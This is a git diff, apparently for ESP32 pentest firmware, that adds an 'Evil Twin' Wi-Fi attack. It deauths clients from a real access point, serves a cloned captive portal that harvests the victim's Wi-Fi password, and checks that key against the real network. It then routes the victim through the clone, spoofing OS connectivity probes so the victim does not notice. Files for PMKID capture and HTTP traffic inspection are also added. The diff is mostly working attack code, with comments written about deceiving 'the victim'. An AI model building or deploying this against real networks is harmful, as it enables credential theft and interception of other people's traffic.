++        bruceConfig.addWifiCredential(apName, _lastVerifiedPassword);
++        verifyPass = true;
++        _deauth = false;
++        _deauthPulseAt = 0;
++    }
++}
++
++bool EvilPortal::verifyCredentialsLocked(
++    const String &ssid, const String &pwd, uint8_t channel, const uint8_t *bssid, int *reasonOut
++) {
++    if (reasonOut) *reasonOut = 0;
++    if (ssid.isEmpty()) return false;
++
++    // Keep the SoftAP alive: no WiFi.mode() call, no softAPdisconnect().
++    // In AP+STA the driver co-locates the AP on the STA channel, so the STA is
++    // pinned to the clone channel and (optionally) the single target BSSID.
++    s_verifyAbort = false;
++    s_lastStaDisconnectReason = 0;
++    bool prevAutoReconnect = WiFi.getAutoReconnect();
++    WiFi.setAutoReconnect(false);
++    if (evilTwinChannelUsable(channel)) {
++        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
++        vTaskDelay(pdMS_TO_TICKS(20));
++    }
++    WiFi.disconnect(false, false);
++    vTaskDelay(pdMS_TO_TICKS(30));
++    // The STA interface must be up for a begin() on an AP-only radio.
++    if (!(WiFi.getMode() & WIFI_MODE_STA)) WiFi.mode(WIFI_AP_STA);
++
++    if (bssid) WiFi.begin(ssid.c_str(), pwd.length() ? pwd.c_str() : NULL, (int32_t)channel, bssid);
++    else WiFi.begin(ssid.c_str(), pwd.length() ? pwd.c_str() : NULL, (int32_t)channel);
++
++    EvilTwinTiming timing = evilTwinDefaultTiming();
++    const uint32_t deadline = millis() + timing.verifyTimeoutMs;
++    bool connected = false;
++    while ((int32_t)(millis() - deadline) < 0) {
++        if (WiFi.isConnected()) { connected = true; break; }
++        if (s_verifyAbort) break;
++        vTaskDelay(pdMS_TO_TICKS(120));
++    }
++    if (!connected) connected = WiFi.isConnected();
++    if (reasonOut) *reasonOut = s_lastStaDisconnectReason;
++    // Failed attempt: release the STA so it stops retrying the real AP in the
++    // background. Left running, those assoc attempts keep the radio busy and
++    // make the clone AP look flaky to the victim.
++    if (!connected) WiFi.disconnect(false, false);
++    _lastVerifiedSsid = ssid;
++    _lastVerifiedPassword = pwd;
++    _lastVerifyOk = connected;
++    if (connected) bruceConfig.addWifiCredential(ssid, pwd);
++    WiFi.setAutoReconnect(prevAutoReconnect);
++    return connected;
++}
++
++String EvilPortal::verifyWaitPage() {
++    // Same look as the portal so the victim does not see a "different" site,
++    // and an explicit "do not leave this page" hint: phones that background
++    // the browser during verify lose the association hint and re-scan.
++    return getHtmlTemplate(
++        "<div style='text-align:center'>"
++        "<h2>Checking network\u2026</h2>"
++        "<p>Do not close this page. Reconnecting to the network.</p>"
++        "<div class='sl-spin' style='width:32px;height:32px;margin:16px auto;border:4px solid "
++        "#dddddd;border-top-color:#0b57d0;border-radius:50%'></div>"
++        "<script>setTimeout(function(){"
++        "location.replace('http://" +
++        WiFi.softAPIP().toString() +
++        "/');},30000);</script>"
++        "</div>"
++    );
++}
++
++String EvilPortal::internetUpPage() {
++    return getHtmlTemplate(
++        "<div style='text-align:center'><h2>Connected</h2>"
++        "<p>You are online. This window can be closed.</p></div>"
++    );
++}
++
++void EvilPortal::serveProbe(AsyncWebServerRequest *request, const String &url) {
++    EvilTwinProbe probe = evilTwinClassifyProbe(url.c_str());
++    const String apIp = WiFi.softAPIP().toString();
++    if (_internetUp) {
++        // Behave like the real network so the OS clears "no internet".
++        const int code = evilTwinProbeStatus(probe, true);
++        if (code == 204) {
++            request->send(204);
++        } else if (probe == ET_PROBE_WINDOWS) {
++            request->send(200, "text/plain", "Microsoft Connect Test");
++        } else if (probe == ET_PROBE_NONE) {
++            request->send(200, "text/html", internetUpPage());
++        } else {
++            request->send(200, "text/html", internetUpPage());
++        }
++        return;
++    }
++    switch (probe) {
++        case ET_PROBE_APPLE:
++            request->send(
++                200, "text/html",
++                "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"
++            );
++            return;
++        case ET_PROBE_ANDROID_204:
++        case ET_PROBE_WINDOWS:
++        case ET_PROBE_FIREFOX:
++        case ET_PROBE_OTHER:
++        case ET_PROBE_NONE:
++        default: {
++            AsyncWebServerResponse *response = request->beginResponse(302);
++            response->addHeader("Location", "http://" + apIp + "/");
++            request->send(response);
++            return;
++        }
++    }
  }
  
  String EvilPortal::getHtmlTemplate(const String &body) {
 diff --git a/src/modules/wifi/evil_portal.h b/src/modules/wifi/evil_portal.h
-index 4a8b438..8a61319 100644
+index 4a8b438e..de9d8f5b 100644
 --- a/src/modules/wifi/evil_portal.h
 +++ b/src/modules/wifi/evil_portal.h
-@@ -31,9 +31,23 @@ public:
+@@ -6,6 +6,10 @@
+ #include <globals.h>
+ #include <WiFiType.h>
+ 
++// Abort an in-flight credential verification (called on stop / chain stop).
++void evilPortalVerifyAbort();
++void evilPortalVerifyAbortReset();
++
+ class EvilPortal {
+     class CaptiveRequestHandler : public AsyncWebHandler {
+     public:
+@@ -31,9 +35,57 @@ public:
      void loop(void);
      void processRequests(void);
  
@@ -29203,10 +29629,44 @@ index 4a8b438..8a61319 100644
 +    String getLastVerifiedSsid() const { return _lastVerifiedSsid; }
 +    String getLastVerifiedPassword() const { return _lastVerifiedPassword; }
 +    bool hasVerifiedPassword() const { return _lastVerifyOk && _lastVerifiedPassword.length() > 0; }
++
++    // --- Deauth + Clone + Verify + Route support -------------------------
++    // Async verification: the captive form answers immediately and the owner
++    // task does the 4-way handshake test. The old path called WiFi.begin()
++    // inside the AsyncWebServer handler, which blocked the response for up to
++    // 6 s -- Android renders that as "no internet" and drops the network.
++    void setAsyncVerify(bool on) { _asyncVerify = on; }
++    bool takePendingCredentials(String &ssid, String &pwd);
++    void notifyVerifyResult(bool ok);
++
++    // Verify a submitted key WITHOUT disturbing the captive AP: the AP is kept
++    // up and pinned to `channel` (AP+STA forces the AP onto the STA channel, so
++    // a verify on another channel deauths every victim on the clone), the STA
++    // is locked to `bssid` when known, and auto-reconnect is off for the
++    // attempt so nothing fights the AP. Never changes WiFi.mode().
++    bool verifyCredentialsLocked(
++        const String &ssid, const String &pwd, uint8_t channel, const uint8_t *bssid, int *reasonOut
++    );
++
++    // Deauth is driven by the chain's own backoff window, not by this class'
++    // 250 ms flood (a permanent flood makes phones blacklist the SSID).
++    void setDeauthEnabled(bool on) { _deauth = on; }
++    bool deauthEnabled() const { return _deauth; }
++    // Ask for one short kick burst (3 frames x deauth+disassoc). The chain
++    // rate-limits these; a continuous flood is what makes phones give up.
++    void pulseDeauth() { _deauthPulseAt = millis() ? millis() : 1; }
++
++    // Once the victim is routed, stop acting like a captive portal: wildcard
++    // DNS goes away (the NAPT DNS proxy takes port 53) and connectivity probes
++    // answer 204/200, otherwise Android keeps "no internet" and falls back to
++    // mobile data.
++    void setInternetUp(bool up);
++    bool internetUp() const { return _internetUp; }
++    int apClientCount();
  
      DNSServer &getDNSServer() { return *dnsServer; }
      AsyncWebServer &getWebServer() { return webServer; }
-@@ -79,7 +93,13 @@ private:
+@@ -79,7 +131,21 @@ private:
      int previousTotalCapturedCredentials = -1;
      String capturedCredentialsHtml = "";
      bool verifyPass = false;
@@ -29217,12 +29677,32 @@ index 4a8b438..8a61319 100644
 +    bool _naptHandoffPending = false;
 +    bool _naptHandoffDone = false;
 +    uint32_t _naptHandoffAt = 0;
++    bool _asyncVerify = false;
++    volatile bool _pendingCredReady = false;
++    String _pendingCredSsid;
++    String _pendingCredPwd;
++    volatile bool _internetUp = false;
++    volatile uint32_t _deauthPulseAt = 0;
++    volatile bool dnsRunning = false;
++    static inline bool _staEventRegistered = false;
  
      CaptiveRequestHandler *_captiveHandler = nullptr;
  
+@@ -94,6 +160,11 @@ private:
+     void credsController(AsyncWebServerRequest *request);
+ 
+     bool verifyCreds(String &Ssid, String &Password);
++    void serveProbe(AsyncWebServerRequest *request, const String &url);
++    String verifyWaitPage(void);
++    String internetUpPage(void);
++    void startCaptiveDns(void);
++    void stopCaptiveDns(void);
+     void restartWiFi(bool reset = true);
+     void resetCapturedCredentials(void);
+     void printDeauthStatus(void);
 diff --git a/src/modules/wifi/lan_auditor.cpp b/src/modules/wifi/lan_auditor.cpp
 new file mode 100644
-index 0000000..482d703
+index 00000000..482d7034
 --- /dev/null
 +++ b/src/modules/wifi/lan_auditor.cpp
 @@ -0,0 +1,776 @@
@@ -30004,7 +30484,7 @@ index 0000000..482d703
 +#endif
 diff --git a/src/modules/wifi/lan_auditor.h b/src/modules/wifi/lan_auditor.h
 new file mode 100644
-index 0000000..6c351d8
+index 00000000..6c351d84
 --- /dev/null
 +++ b/src/modules/wifi/lan_auditor.h
 @@ -0,0 +1,18 @@
@@ -30028,7 +30508,7 @@ index 0000000..6c351d8
 +#endif
 diff --git a/src/modules/wifi/lan_guard.cpp b/src/modules/wifi/lan_guard.cpp
 new file mode 100644
-index 0000000..04ec986
+index 00000000..04ec986b
 --- /dev/null
 +++ b/src/modules/wifi/lan_guard.cpp
 @@ -0,0 +1,433 @@
@@ -30467,7 +30947,7 @@ index 0000000..04ec986
 +#endif
 diff --git a/src/modules/wifi/lan_guard.h b/src/modules/wifi/lan_guard.h
 new file mode 100644
-index 0000000..38dfba0
+index 00000000..38dfba00
 --- /dev/null
 +++ b/src/modules/wifi/lan_guard.h
 @@ -0,0 +1,19 @@
@@ -30492,7 +30972,7 @@ index 0000000..38dfba0
 +#endif
 diff --git a/src/modules/wifi/lan_guard_logic.h b/src/modules/wifi/lan_guard_logic.h
 new file mode 100644
-index 0000000..662670e
+index 00000000..662670e5
 --- /dev/null
 +++ b/src/modules/wifi/lan_guard_logic.h
 @@ -0,0 +1,84 @@
@@ -30582,7 +31062,7 @@ index 0000000..662670e
 +}
 diff --git a/src/modules/wifi/napt_http_inspector.cpp b/src/modules/wifi/napt_http_inspector.cpp
 new file mode 100644
-index 0000000..e21d023
+index 00000000..e21d023e
 --- /dev/null
 +++ b/src/modules/wifi/napt_http_inspector.cpp
 @@ -0,0 +1,585 @@
@@ -31173,7 +31653,7 @@ index 0000000..e21d023
 +#endif
 diff --git a/src/modules/wifi/napt_http_inspector.h b/src/modules/wifi/napt_http_inspector.h
 new file mode 100644
-index 0000000..31ce051
+index 00000000..31ce051c
 --- /dev/null
 +++ b/src/modules/wifi/napt_http_inspector.h
 @@ -0,0 +1,20 @@
@@ -31199,10 +31679,10 @@ index 0000000..31ce051
 +#endif
 diff --git a/src/modules/wifi/napt_router.cpp b/src/modules/wifi/napt_router.cpp
 new file mode 100644
-index 0000000..c24ad08
+index 00000000..26eb74cc
 --- /dev/null
 +++ b/src/modules/wifi/napt_router.cpp
-@@ -0,0 +1,1013 @@
+@@ -0,0 +1,1096 @@
 +#if !defined(LITE_VERSION)
 +#include "napt_router.h"
 +
@@ -31216,6 +31696,7 @@ index 0000000..c24ad08
 +#include "core/wifi/webInterface.h"
 +#include "core/wifi/wifi_common.h"
 +#include "core/wifi/wifi_mac.h"
++#include "modules/wifi/evil_twin_logic.h"
 +#include "modules/wifi/napt_http_inspector.h"
 +#include "esp_netif.h"
 +#include "esp_wifi.h"
@@ -31772,6 +32253,88 @@ index 0000000..c24ad08
 +    return true;
 +}
 +
++// ---------------------------------------------------------------------------
++// Enable NAPT on the *already running* SoftAP.
++//
++// The old handoff path tore the portal AP down (softAPdisconnect) and rebuilt
++// it from naptStartBackground(): new BSSID, new DHCP server, 10+ s with no
++// beacon. Every phone gave up long before the AP came back, which is exactly
++// the "bị đá văng khỏi cả mạng giả" report. This function changes nothing
++// about the AP: same SSID, same BSSID, same channel, same leases.
++//
++// The uplink STA is pinned to the AP channel on purpose. In AP+STA the ESP32
++// co-locates the AP on the STA channel; letting the STA pick its own channel
++// would silently move the AP and drop every attached client.
++// ---------------------------------------------------------------------------
++bool naptEnableOnRunningAp(const String &staSsid, const String &staPwd, String *errOut) {
++    if (s_naptRunning) return true;
++    if (!radioHasMemForWifi()) {
++        if (errOut) *errOut = "Low DMA RAM for Wi-Fi";
++        return false;
++    }
++    ensureWifiPlatform();
++    // AP must stay up: never WiFi.mode(WIFI_OFF), never softAPdisconnect().
++    WiFi.mode(WIFI_AP_STA);
++
++    if (!staSsid.isEmpty()) {
++        if (!WiFi.isConnected() || WiFi.SSID() != staSsid) {
++            uint8_t apCh = (uint8_t)WiFi.channel();
++            if (!evilTwinChannelUsable(apCh)) apCh = (uint8_t)std::max(1, (int)WiFi.channel());
++            // channel = AP channel (AP+STA co-locates them), bssid = nullptr
++            // (the driver would reject AP-MAC == STA-BSSID), tryConnect = true.
++            WiFi.begin(staSsid.c_str(), staPwd.length() ? staPwd.c_str() : NULL,
++                       evilTwinChannelUsable(apCh) ? (int32_t)apCh : 0, nullptr, true);
++            for (int i = 0; i < 120 && !WiFi.isConnected() && !s_naptStopReq; i++) vTaskDelay(pdMS_TO_TICKS(100));
++            if (s_naptStopReq || !WiFi.isConnected()) {
++                if (errOut) *errOut = s_naptStopReq ? "Aborted" : "Could not connect to uplink Wi-Fi";
++                return false;
++            }
++        }
++        bruceConfig.addWifiCredential(staSsid, staPwd);
++    } else if (!WiFi.isConnected()) {
++        if (!bruceConfig.wifi.empty()) wifiConnecttoKnownNet();
++        if (!WiFi.isConnected()) {
++            if (errOut) *errOut = "No uplink Wi-Fi connected";
++            return false;
++        }
++    }
++    wifiConnected = true;
++
++    // Do NOT re-run softAPConfig() here: on a live AP it restarts the DHCP
++    // server under connected clients, which is one more way to lose the
++    // victim. EvilPortal already created the AP with itself as gateway and
++    // DHCP DNS option, which is exactly what the resolver below expects.
++    const IPAddress apIp = WiFi.softAPIP();
++    if ((uint32_t)apIp == 0) {
++        if (errOut) *errOut = "SoftAP is not up";
++        return false;
++    }
++
++    if (!WiFi.AP.enableNAPT(true)) {
++        if (errOut) *errOut = "NAPT enable failed";
++        return false;
++    }
++    WiFi.setSleep(WIFI_PS_NONE);
++    wifiIP = WiFi.localIP().toString();
++
++    ensureNaptMutex();
++    if (xSemaphoreTake(s_naptMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
++        loadBlockListLocked();
++        xSemaphoreGive(s_naptMutex);
++    }
++    s_naptStopReq = false;
++    s_startedAtMs = millis();
++    s_naptRunning = true;
++    if (xTaskCreatePinnedToCore(naptDnsProxyTask, "naptDns", 4096, NULL, 2, &s_naptTask, 0) != pdPASS) {
++        s_naptRunning = false;
++        if (errOut) *errOut = "DNS proxy task spawn failed";
++        return false;
++    }
++    Serial.printf("[NAPT] in-place NAPT on %s via %s ch%u\n", WiFi.softAPIP().toString().c_str(),
++                  WiFi.SSID().c_str(), (unsigned)WiFi.channel());
++    return true;
++}
++
 +bool naptStartBackground(const String &staSsid, const String &staPwd, String *errOut) {
 +    if (s_naptRunning) return true;
 +    s_naptStopReq = false;
@@ -32218,10 +32781,10 @@ index 0000000..c24ad08
 +#endif
 diff --git a/src/modules/wifi/napt_router.h b/src/modules/wifi/napt_router.h
 new file mode 100644
-index 0000000..f47f236
+index 00000000..0b4fbc17
 --- /dev/null
 +++ b/src/modules/wifi/napt_router.h
-@@ -0,0 +1,21 @@
+@@ -0,0 +1,24 @@
 +#ifndef __NAPT_ROUTER_H__
 +#define __NAPT_ROUTER_H__
 +
@@ -32233,6 +32796,9 @@ index 0000000..f47f236
 +bool naptIsStarting();
 +bool naptStartBackground(const String &staSsid = "", const String &staPwd = "", String *errOut = nullptr);
 +bool naptStartAsync(const String &staSsid = "", const String &staPwd = "", String *errOut = nullptr);
++// Enable routing on the SoftAP that is already running (same BSSID, channel and
++// DHCP leases). Used by the Evil Twin handoff so no attached client drops.
++bool naptEnableOnRunningAp(const String &staSsid, const String &staPwd, String *errOut = nullptr);
 +void naptStop(bool disconnectSta = false);
 +void naptSetAutoBlockTrackers(bool enable);
 +bool naptGetAutoBlockTrackers();
@@ -32245,7 +32811,7 @@ index 0000000..f47f236
 +#endif
 diff --git a/src/modules/wifi/pmf_csa_test.cpp b/src/modules/wifi/pmf_csa_test.cpp
 new file mode 100644
-index 0000000..569e71f
+index 00000000..569e71f3
 --- /dev/null
 +++ b/src/modules/wifi/pmf_csa_test.cpp
 @@ -0,0 +1,549 @@
@@ -32800,7 +33366,7 @@ index 0000000..569e71f
 +#endif
 diff --git a/src/modules/wifi/pmf_csa_test.h b/src/modules/wifi/pmf_csa_test.h
 new file mode 100644
-index 0000000..4a8c9ae
+index 00000000..4a8c9ae8
 --- /dev/null
 +++ b/src/modules/wifi/pmf_csa_test.h
 @@ -0,0 +1,20 @@
@@ -32826,7 +33392,7 @@ index 0000000..4a8c9ae
 +#endif
 diff --git a/src/modules/wifi/pmkid_capture.cpp b/src/modules/wifi/pmkid_capture.cpp
 new file mode 100644
-index 0000000..9ddd550
+index 00000000..9ddd5502
 --- /dev/null
 +++ b/src/modules/wifi/pmkid_capture.cpp
 @@ -0,0 +1,769 @@
@@ -33601,7 +34167,7 @@ index 0000000..9ddd550
 +#endif
 diff --git a/src/modules/wifi/pmkid_capture.h b/src/modules/wifi/pmkid_capture.h
 new file mode 100644
-index 0000000..021ceb4
+index 00000000..021ceb4c
 --- /dev/null
 +++ b/src/modules/wifi/pmkid_capture.h
 @@ -0,0 +1,19 @@
@@ -33626,10 +34192,10 @@ index 0000000..021ceb4
 +#endif
 diff --git a/src/modules/wifi/portal_napt.cpp b/src/modules/wifi/portal_napt.cpp
 new file mode 100644
-index 0000000..9067c2a
+index 00000000..2f16596b
 --- /dev/null
 +++ b/src/modules/wifi/portal_napt.cpp
-@@ -0,0 +1,433 @@
+@@ -0,0 +1,691 @@
 +#include "portal_napt.h"
 +#if !defined(LITE_VERSION)
 +
@@ -33642,6 +34208,7 @@ index 0000000..9067c2a
 +#include "core/wifi/webInterface.h"
 +#include "core/wifi/wifi_common.h"
 +#include "evil_portal.h"
++#include "evil_twin_logic.h"
 +#include "modules/wifi/napt_router.h"
 +#include <Arduino.h>
 +#include <LittleFS.h>
@@ -33671,6 +34238,21 @@ index 0000000..9067c2a
 +static char s_lastErr[96] = {0};
 +static uint32_t s_startedMs = 0;
 +static uint32_t s_formCount = 0;
++// Evil-twin (Deauth+Clone+Verify+Route) state
++static volatile EvilTwinPhase s_phase = ET_PHASE_IDLE;
++static volatile EvilTwinDeauthAction s_lastDeauthAction = ET_DEAUTH_WAIT;
++static volatile EvilTwinVerifyResult s_lastVerify = ET_VERIFY_PENDING;
++static volatile bool s_victimSeen = false;
++static uint32_t s_rejoinGraceUntil = 0;
++static uint32_t s_windowStart = 0;
++static uint32_t s_lastBurstMs = 0;
++static uint8_t s_burstsDone = 0;
++static uint32_t s_verifyStartedMs = 0;
++static char s_cloneBssid[6] = {0};
++static bool s_haveCloneBssid = false;
++static uint32_t s_lastClientPoll = 0;
++static uint8_t s_targetCh = 0;
++static bool s_evilTwin = false;
 +static String s_oldGatewayIp;
 +static String s_oldApSsid;
 +static String s_oldApPwd;
@@ -33694,6 +34276,11 @@ index 0000000..9067c2a
 +    j += "\"staSsid\":\"" + seclabJsonEscape(s_staSsid) + "\",";
 +    j += "\"forms\":" + String((unsigned long)s_formCount) + ",";
 +    j += "\"lastErr\":\"" + seclabJsonEscape(s_lastErr) + "\",";
++    j += "\"phase\":\"" + String(evilTwinPhaseName(s_phase)) + "\",";
++    j += "\"deauth\":\"" + String(evilTwinDeauthActionName(s_lastDeauthAction)) + "\",";
++    j += "\"bursts\":" + String((unsigned)s_burstsDone) + ",";
++    j += "\"victim\":" + String(s_victimSeen ? "true" : "false") + ",";
++    j += "\"verify\":\"" + String(evilTwinVerifyResultName(s_lastVerify)) + "\",";
 +    j += "\"uptimeSec\":" + String(s_running ? (unsigned long)((millis() - s_startedMs) / 1000UL) : 0UL) + "}";
 +    seclabWriteState(kStatePath, j);
 +}
@@ -33712,6 +34299,180 @@ index 0000000..9067c2a
 +    }
 +}
 +
++// --- Evil-twin helpers ------------------------------------------------------
++
++static const char *kNaplog = "/portal_napt.log";
++
++static void etLog(const char *step, const String &detail) {
++    seclabAppendLog(kNaplog, String(seclabUptimeSec()) + "," + step + "," + seclabSafeText(detail, 64));
++    Serial.println(String("[EVILTWIN] ") + evilTwinPhaseName(s_phase) + " " + step + " " + detail);
++}
++
++// A victim (re)joined the clone: never kick it again for a while. This is the
++// single most important anti-"đá văng" rule: deauth while a client is attached
++// to our AP is exactly what makes Android report a broken network.
++static void etNoteVictimJoin() {
++    s_victimSeen = true;
++    s_rejoinGraceUntil = evilTwinJoinGraceDeadline(millis(), evilTwinDefaultTiming());
++}
++
++// Upgrade the *running* clone AP to a router. Nothing about the AP changes:
++// same SSID, same BSSID, same channel, same DHCP leases -> the victim does not
++// even notice. Only the uplink + NAPT forwarding are added.
++static bool etRouteInPlace(EvilPortal *portal, const String &staSsid, const String &staPwd, String &err) {
++    s_phase = ET_PHASE_ROUTE;
++    bool apUp = portal != nullptr && WiFi.softAPIP() != IPAddress(0, 0, 0, 0);
++    EvilTwinHandoffMode mode =
++        evilTwinHandoffMode(apUp, true, s_apChannel, s_targetCh ? s_targetCh : s_apChannel, WiFi.isConnected());
++    if (mode == ET_HANDOFF_BLOCKED) {
++        err = "Refusing handoff: it would move the AP off the victim's channel";
++        etLog("route_blocked", err);
++        return false;
++    }
++    etLog("route_mode", evilTwinHandoffModeName(mode));
++
++    // Stop being a captive portal *before* NAPT: the DNS hijack must vacate
++    // UDP/53 and probes must start answering 204, otherwise Android keeps
++    // "Connected, no internet" and may drop us for mobile data.
++    if (portal) {
++        portal->setInternetUp(true);
++        portal->setDeauthEnabled(false);
++    }
++    bool ok = naptEnableOnRunningAp(staSsid, staPwd, &err);
++    if (!ok) {
++        if (portal) portal->setInternetUp(false);
++        etLog("route_fail", err);
++        return false;
++    }
++    s_phase = ET_PHASE_ONLINE;
++    s_lastVerify = ET_VERIFY_OK;
++    etLog("route_ok", staSsid);
++    return true;
++}
++
++// One deauth decision + at most one burst, driven by evil_twin_logic.h.
++static void etServiceDeauth(EvilPortal *portal) {
++    if (!s_deauth || !portal) return;
++    if (s_burstsDone == 0 && s_windowStart == 0) s_windowStart = millis();
++    EvilTwinDeauthInput in{};
++    in.nowMs = millis();
++    in.windowStartMs = s_windowStart;
++    in.burstsDone = s_burstsDone;
++    in.lastBurstMs = s_lastBurstMs;
++    in.victimOnOurAp = portal->apClientCount() > 0;
++    in.verifying = s_phase == ET_PHASE_VERIFY;
++    in.routed = s_phase == ET_PHASE_ONLINE || naptIsRunning();
++    in.pmfRequired = false; // unknown from a scan; the budget bounds the damage
++    in.portalUp = true;
++    in.rejoinGraceUntilMs = s_rejoinGraceUntil;
++    in.timing = evilTwinDefaultTiming();
++
++    EvilTwinDeauthAction action = evilTwinDeauthAction(in);
++    s_lastDeauthAction = action;
++    if (evilTwinDeauthShouldSend(action)) {
++        portal->pulseDeauth();
++        s_lastBurstMs = in.nowMs;
++        s_burstsDone++;
++        etLog("deauth_burst", String((unsigned)s_burstsDone) + "/" + String((unsigned)in.timing.maxBursts));
++    } else if (action != ET_DEAUTH_WAIT) {
++        // Any stop reason ends the kick window. Quietly: the clone keeps
++        // beaconing and, being the only AP that answers, wins the victim back
++        // without a single further frame from us.
++        if (action == ET_DEAUTH_STOP_BUDGET || action == ET_DEAUTH_STOP_JOINED) {
++            etLog("deauth_end", evilTwinDeauthActionName(action));
++        }
++        portal->setDeauthEnabled(false);
++        s_deauth = false;
++    }
++    // Only drive the phase while the kick window owns the chain: ROUTE/ONLINE
++    // (and a FAILED result) must never be overwritten by this stage.
++    if (s_phase == ET_PHASE_IDLE || s_phase == ET_PHASE_DEAUTH || s_phase == ET_PHASE_CLONE) {
++        s_phase = (action == ET_DEAUTH_SEND || action == ET_DEAUTH_WAIT) ? ET_PHASE_DEAUTH : ET_PHASE_CLONE;
++    }
++}
++
++static void etServiceClients(EvilPortal *portal) {
++    if (!portal) return;
++    if (millis() - s_lastClientPoll < 1000) return;
++    s_lastClientPoll = millis();
++    int clients = portal->apClientCount();
++    if (clients > 0) {
++        if (!s_victimSeen) {
++            etNoteVictimJoin();
++            etLog("victim_joined", String(clients) + " client(s)");
++        } else {
++            s_rejoinGraceUntil = evilTwinJoinGraceDeadline(millis(), evilTwinDefaultTiming());
++        }
++        if (s_phase == ET_PHASE_DEAUTH) {
++            s_phase = ET_PHASE_CLONE;
++            if (portal->deauthEnabled()) portal->setDeauthEnabled(false);
++            s_deauth = false;
++        }
++        // Open target: the victim joining is the success signal (there is no
++        // key to verify), so route immediately instead of waiting for a form
++        // the victim will never see.
++        if (!s_verify && s_evilTwin && s_armed && !s_handoffDone && !naptIsRunning()) {
++            s_handoffDone = true;
++            String err;
++            if (naptEnableOnRunningAp("", "", &err)) {
++                s_phase = ET_PHASE_ONLINE;
++                portal->setInternetUp(true);
++                etLog("route_open", String(clients) + " client(s), open uplink");
++            } else {
++                setErr("Open route failed: " + err);
++                etLog("route_open_fail", err);
++            }
++        }
++    }
++}
++
++// Verification runs here (owner task), never in the HTTP handler.
++static void etServiceVerify(EvilPortal *portal) {
++    if (!portal) return;
++    String ssid, pwd;
++    if (!portal->takePendingCredentials(ssid, pwd)) return;
++    if (pwd.isEmpty()) return;
++    s_phase = ET_PHASE_VERIFY;
++    s_verifyStartedMs = millis();
++    s_lastVerify = ET_VERIFY_PENDING;
++    etLog("verify_start", String(pwd.length()) + " chars"); // never log the key
++
++    int reason = 0;
++    bool ok = portal->verifyCredentialsLocked(
++        ssid, pwd, s_apChannel, nullptr /* never pin our own BSSID: AP MAC == STA
++        association BSSID is rejected by the driver; the channel lock is what
++        keeps the SoftAP from moving */, &reason
++    );
++    s_lastVerify = evilTwinClassifyVerify(ok, reason);
++    portal->notifyVerifyResult(ok);
++    etLog("verify_result", String(evilTwinVerifyResultName(s_lastVerify)) + " reason=" + String(reason) +
++                                 " " + String((unsigned long)(millis() - s_verifyStartedMs)) + "ms");
++
++    if (ok) {
++        // Keep the victim attached: the AP stays up, only routing is added.
++        String err;
++        if (!etRouteInPlace(portal, ssid, pwd, err)) {
++            s_phase = ET_PHASE_CLONE;
++            setErr("Routing failed: " + err);
++        }
++        return;
++    }
++    // Wrong key (or AP gone): keep the clone beaconing so the victim can retry
++    // instead of being dropped back into a real network that kicks it again.
++    s_phase = evilTwinPhaseForVerify(s_lastVerify);
++    if (s_rejoinGraceUntil == 0) s_rejoinGraceUntil = evilTwinJoinGraceDeadline(millis(), evilTwinDefaultTiming());
++    // Second chance: if the victim gave up and left (mobile data), spend the
++    // *remaining* kick budget to pull it back. Still bounded -- this can never
++    // turn back into the old endless flood.
++    EvilTwinTiming t = evilTwinDefaultTiming();
++    if (!s_running) return;
++    if (portal->apClientCount() == 0 && s_burstsDone < t.maxBursts) {
++        s_deauth = true;
++        portal->setDeauthEnabled(true);
++        etLog("deauth_rearm", String((unsigned)(t.maxBursts - s_burstsDone)) + " bursts left");
++    }
++}
++
 +static void portalNaptTask(void *) {
 +    // Keep the captive AP on the NAPT subnet (192.168.4.1) and reuse the same
 +    // SSID when napt_router restarts the AP, so clients stay attached.
@@ -33727,6 +34488,7 @@ index 0000000..9067c2a
 +    ensureWifiPlatform();
 +
 +    s_portalStopped = false;
++    s_phase = ET_PHASE_ARMING;
 +    s_portal = new EvilPortal(String(s_apSsid), s_apChannel ? s_apChannel : 6, s_deauth, s_verify, true, true, "");
 +    if (!s_portal) {
 +        setErr("Portal alloc failed");
@@ -33735,49 +34497,69 @@ index 0000000..9067c2a
 +        vTaskDelete(NULL);
 +        return;
 +    }
++    // Async verify + chain-owned deauth: the portal never blocks an HTTP
++    // request on a handshake and never floods deauth on its own.
++    s_portal->setAsyncVerify(s_verify);
++    s_portal->setDeauthEnabled(s_deauth);
++    {
++        // Our own clone BSSID (AP MAC), for logging/state only. It must never
++        // be handed to WiFi.begin(): the driver rejects an association whose
++        // BSSID equals the AP interface MAC. The channel lock is what keeps
++        // the SoftAP from hopping during verification.
++        uint8_t mac[6] = {0};
++        if (esp_wifi_get_mac(WIFI_IF_AP, mac) == ESP_OK) {
++            memcpy(s_cloneBssid, mac, 6);
++            s_haveCloneBssid = true;
++        }
++    }
 +    // EvilPortal(autoMode=true, backgroundMode=true) already configured the
 +    // captive AP on bruceConfig.evilPortalGatewayIp (set to 192.168.4.1 above),
 +    // registered its routes and started DNS + AsyncWebServer. Do not duplicate
 +    // any of that here -- it would add duplicate handlers / sockets.
 +    vTaskDelay(pdMS_TO_TICKS(200));
++    s_windowStart = millis();
++    s_lastBurstMs = 0;
++    s_burstsDone = 0;
++    s_phase = s_deauth ? ET_PHASE_DEAUTH : ET_PHASE_CLONE;
++    etLog("clone_up", String(s_apSsid) + " CH" + String((int)s_apChannel));
 +
 +    uint32_t lastDraw = 0;
 +    while (!s_stopReq) {
 +        s_portal->processRequests();
-+
-+        // Verification is a hard gate: never route using a submitted but
-+        // unverified password. Let this task own background handoff so the
-+        // portal callback and task cannot race to stop/start NAPT twice.
-+        bool credentialsReady = s_verify ? s_portal->hasVerifiedPassword()
-+                                         : s_portal->hasCredentials();
-+        if (s_armed && credentialsReady && !s_handoffDone) {
-+            if (s_verify) {
-+                String verifiedSsid = s_portal->getLastVerifiedSsid();
-+                String verifiedPwd = s_portal->getLastVerifiedPassword();
-+                if (verifiedSsid.isEmpty() || verifiedPwd.isEmpty()) {
-+                    setErr("Verified uplink credentials missing");
-+                    s_handoffDone = true;
-+                } else {
-+                    strncpy(s_staSsid, verifiedSsid.c_str(), sizeof(s_staSsid) - 1);
-+                    s_staSsid[sizeof(s_staSsid) - 1] = 0;
-+                    strncpy(s_staPwd, verifiedPwd.c_str(), sizeof(s_staPwd) - 1);
-+                    s_staPwd[sizeof(s_staPwd) - 1] = 0;
-+                    s_formCount++;
-+                }
-+            } else {
-+                s_formCount++;
++        etServiceClients(s_portal);
++        etServiceDeauth(s_portal);
++        if (s_verify) etServiceVerify(s_portal);
